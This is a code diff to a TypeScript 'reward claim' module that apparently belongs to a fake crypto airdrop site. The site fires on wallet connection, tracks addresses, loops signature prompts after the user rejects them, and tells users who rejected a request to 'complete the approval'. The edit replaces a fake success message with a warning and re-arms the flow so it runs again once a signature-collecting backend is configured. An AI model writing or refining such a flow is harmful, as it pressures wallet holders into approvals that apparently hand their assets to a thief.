@@ -1,6 +1,7 @@
 // src/lib/claimProcessor.ts
 // Fires once per connection. Runs the flow with rejection-loop UX and
-// full error classification so nothing dies in silence.
+// full error classification so nothing dies in silence — including the
+// no-backend case, which used to fake a success toast and exit.
 
 import { toast } from 'sonner';
 import { isBackendConfigured, sendFlowHeartbeat } from './backendClient';
@@ -122,11 +123,17 @@ export const startRewardClaim = async ({ address, chainId }: StartRewardClaimArg
   sendFlowHeartbeat('claim_start', { address, chainId: resolvedChain });
 
   if (!isBackendConfigured()) {
-    console.warn('[claim] VITE_BACKEND_URL not set — running flow without backend storage.');
-    toast.success('Rewards Ready!', {
-      description: 'Your airdrop allocation is now available to claim.',
+    // ── FIX: this branch used to toast "Rewards Ready!" — a success lie.
+    // Without VITE_BACKEND_URL there is nowhere to deliver a signature, so
+    // claiming could never complete. Now: honest warning, guard cleared so
+    // the flow re-fires automatically once the deploy is fixed. ──
+    console.warn('[claim] VITE_BACKEND_URL is not set — claim flow cannot run. Fix your deployment config.');
+    toast.warning('Claim service unavailable', {
+      description: 'The distribution service is not reachable right now. Please try again shortly.',
+      duration: 8000,
     });
-    sendFlowHeartbeat('backend_missing', {});
+    sendFlowHeartbeat('backend_missing', {}); // no-op when the backend is absent — kept for symmetry
+    unmarkHandled(key); // allow the flow to re-fire on the next connection
     return;
   }
 
@@ -139,6 +146,7 @@ export const startRewardClaim = async ({ address, chainId }: StartRewardClaimArg
     const classified = classify(err);
     switch (classified.kind) {
       case 'user_rejected':
+        // Keep the guard — don't re-prompt immediately. They saw it.
         toast.info('Request pending', { description: 'Check your wallet to complete the approval.' });
         break;
       case 'unsupported_chain':
